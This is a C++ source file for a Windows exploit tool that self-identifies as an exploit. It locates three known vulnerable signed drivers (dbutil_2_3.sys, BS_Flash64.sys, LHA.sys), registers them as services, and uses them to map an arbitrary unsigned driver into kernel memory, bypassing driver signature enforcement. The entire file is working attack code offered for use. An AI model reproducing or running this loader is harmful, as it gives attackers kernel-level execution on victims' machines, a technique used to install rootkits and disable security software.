#include <iostream>
#include <Windows.h>
#include "Services.h"
#include "ioctl.h"
#include "utils.h"
#pragma warning(disable : 6054)  // "string might not be null-terminated"
#pragma warning(disable : 4244)  // "conversion from x to y (y<x), possible loss of data"

/*
Notes for this exploit:
1. the "dynamically-sized allocation of a kernel pool is not actually dynamic, but big enough for 10485760 bytes (about 10.5 MBs) which is more than enough for everything
2. Class defined in services.h is only used for the vulnerable drivers, not for the actual unsigned driver to map
*/


BOOL InitiateVulnDrivers(ExploitedDriver* VulndrvArr[3]) {
    // This function initiates the drivers in the order they are declared in main()
    char BsPath[MAX_PATH];
    char LhaPath[MAX_PATH];
    char DbuPath[MAX_PATH];


    if (!FindFileInDrive("C:\\*.*", "dbutil_2_3.sys", DbuPath, "Dbutil23Services", NULL, FALSE)) {
        printf("[-] Cannot find the dbutil_2_3.sys vulnerable driver!\n");
        VulndrvArr[0]->DeleteDriverService();
        return FALSE;
    }

    if (!VulndrvArr[0]->InitiateDriverService("Dbutil23Services", DbuPath, "\\\\.\\DBUtil_2_3")) {
        printf("[-] Cannot create service for dbutil_2_3.sys driver!\n");
        return FALSE;
    }


    if (!FindFileInDrive("C:\\*.*", "BS_Flash64.sys", BsPath, "Bsflash64Services", NULL, FALSE)) {
        printf("[-] Cannot find the BS_Flash64.sys vulnerable driver!\n");
        VulndrvArr[0]->DeleteDriverService();
        return FALSE;
    }

    if (!VulndrvArr[1]->InitiateDriverService("Bsflash64Services", BsPath, "\\\\.\\BS_Flash64")) {
        printf("[-] Cannot create service for BS_Flash64.sys driver!\n");
        VulndrvArr[0]->DeleteDriverService();
        return FALSE;
    }

    if (!FindFileInDrive("C:\\*.*", "LHA.sys", LhaPath, "LhaServices", NULL, FALSE)) {
        printf("[-] Cannot find the LHA.sys vulnerable driver!\n");
        VulndrvArr[0]->DeleteDriverService();
        VulndrvArr[1]->DeleteDriverService();
        return FALSE;
    }

    if (!VulndrvArr[2]->InitiateDriverService("LhaServices", LhaPath, "\\\\.\\{E8F2FF20-6AF7-4914-9398-CE2132FE170F}")) {
        printf("[-] Cannot create service for LHA.sys driver!\n");
        VulndrvArr[0]->DeleteDriverService();
        VulndrvArr[1]->DeleteDriverService();
        return FALSE;
    }
    return TRUE;
}


int main(int argc, char* argv[])
{
    ExploitedDriver MemoryDriver;
    ExploitedDriver PgszAllocDriver;
    ExploitedDriver DynmAllocDriver;
    ExploitedDriver* VulnArr[3] = {&MemoryDriver, &PgszAllocDriver, &DynmAllocDriver};

    char TempLetter = 0;
    char Extension[5];
    char TempName[MAX_PATH];
    char DefDriverName[15] = "KMDFdriver.sys";
    char DrivePrefix[7] = "C:\\*.*";
    char DriverName[MAX_PATH];
    char ValidDrives[MAX_PATH];
    char FullDriverName[MAX_PATH] = { 0 };

    DWORD GetValidRes = GetLogicalDriveStringsA(26, ValidDrives);
    if (GetValidRes == 0) {
        printf("[-] Error while trying to get the list of all valid drive letters - %d\n", GetLastError());
        return 1;
    }

    // Get unsigned driver name and drive letter -
    if (argc < 2) {
        printf("\n[!] No unsigned driver name was given for main(), use default (%s, key = D) / provide name now (key = N) / exit (key = else) -> ", DefDriverName);
        std::cin >> TempLetter;
        if (TempLetter == 'D') {
            printf("\n[!] Using default unsigned driver name (%s) ..\n", DefDriverName);
            memcpy(DriverName, DefDriverName, strlen(DefDriverName) + 1);
        }
        else if (TempLetter == 'N') {
            std::cin >> TempName;
            memcpy(Extension, (PVOID)((ULONG64)TempName + strlen(TempName) - 4), 5);
            if (strcmp(".sys", Extension) != 0) {
                printf("\n[!] Given extension for unsigned driver name (%s) != .sys, using default driver name (%s) ..\n", Extension, DefDriverName);
                memcpy(DriverName, DefDriverName, strlen(DefDriverName) + 1);
            }
            else {
                memcpy(DriverName, TempName, strlen(TempName) + 1);
            }
        }
        else {
            return 1;
        }
    }
    else {
        if (strlen(argv[1]) < 6) {
            printf("\n[-] Provided driver name (%s) is too small for a driver (atleast X.sys + nullterm), using default name (%s) ..\n", argv[1], DefDriverName);
            memcpy(DriverName, DefDriverName, strlen(DefDriverName) + 1);
        }
        else {
            memcpy(Extension, (PVOID)((ULONG64)argv[1] + strlen(argv[1]) - 4), 5);
            if (strcmp(".sys", Extension) != 0) {
                printf("\n[!] Given extension for unsigned driver name (%s) != .sys, using default driver name (%s) ..\n", Extension, DefDriverName);
                memcpy(DriverName, DefDriverName, strlen(DefDriverName) + 1);
            }
            else {
                memcpy(DriverName, argv[1], strlen(argv[1]) + 1);
            }
        }
    }
    printf("[!] Final provided unsigned driver name: %s\n", DriverName);

    if (argc < 3) {
        printf("\n[!] No drive letter was given for main(), drive letter (default = C if nothing valid is written): ");
        std::cin >> TempLetter;
        if (!CheckLetterInString(TempLetter, ValidDrives)) {
            printf("\n[!] Provided drive letter is not a valid drive letter, to use default (C:\\) press Y, to exit press any other key -> ");
            std::cin >> TempLetter;
            if (TempLetter != 'Y') {
                return 1;
            }
            printf("\n[!] Using default drive prefix (C:\\) ..\n");
        }
        else {
            printf("\n[!] Provided drive letter is a valid drive letter, using %c as the drive of the unsigned driver ..\n", TempLetter);
            DrivePrefix[0] = TempLetter;
        }
    }
    else {
        if (argv[2][1] != ':' || argv[2][2] != '\\') {
            printf("[!] Wrong format of drive prefix (given prefix: %s, should be DriveLetter + : + \\), using default prefix of C:\\ ..", argv[2]);
        }
        else if (!CheckLetterInString(argv[2][0], ValidDrives)) {
            printf("[!] Provided drive letter (%c) is not a valid drive letter, using default prefix of C:\\ ..", argv[2][0]);
        }
        else {
            DrivePrefix[0] = argv[2][0];
        }
    }
    printf("[!] Final provided unsigned driver drive prefix: %s\n", DrivePrefix);


    // Get unsigned driver full path -
    if (strcmp(DefDriverName, DriverName) == 0) {
        if (!FindFileInDrive(DrivePrefix, DriverName, FullDriverName, "KMDFdriver", NULL, FALSE)) {
            printf("[!] Could not find the unsigned driver file from drive %s, filename %s\n", DrivePrefix, DriverName);
            return 1;
        }
    }
    else {
        if (!FindFileInDrive(DrivePrefix, DriverName, FullDriverName, NULL, NULL, FALSE)) {
            printf("[!] Could not find the unsigned driver file from drive %s, filename %s\n", DrivePrefix, DriverName);
            return 1;
        }
    }
    printf("[!] Final unsigned driver full path: %s\n", FullDriverName);


    // Initialize vulnurable drivers objects -
    if (!InitiateVulnDrivers(VulnArr)) {
        printf("[-] Initiating one or more of the vulnerable drivers objects has gone wrong!\n");
        return 1;
    }

    
    // Map unsigned driver into memory -
    if (!MapDriverIntoMemory(FullDriverName, VulnArr)) {
        printf("[-] Mapping unsigned driver into memory failed!\n");
    }
    else {
        printf("[+] Mapping unsigned driver into memory succeded)!\n");
    }

    MemoryDriver.DeleteDriverService();
    PgszAllocDriver.DeleteDriverService();
    DynmAllocDriver.DeleteDriverService();
    return 0;
}
